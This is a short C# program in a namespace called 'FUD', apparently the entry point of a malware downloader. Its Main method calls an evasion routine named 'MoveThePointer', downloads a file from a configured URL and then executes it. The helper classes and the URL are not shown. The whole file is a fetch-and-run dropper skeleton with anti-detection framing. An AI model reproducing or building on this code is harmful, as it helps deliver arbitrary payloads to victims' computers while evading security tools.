using System;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace FUD
{
    class Program
    {
        private static Client _client = new Client();
        private static ProtectorVM _protector = new ProtectorVM();
        static void Main(string[] args)
        {
            _protector.MoveThePointer();
            string FileLocate = _client.FileName();
            _client.Download(FileLocate, Config.URL);
            _client.Runprocess(FileLocate);
        }
    }
}
       
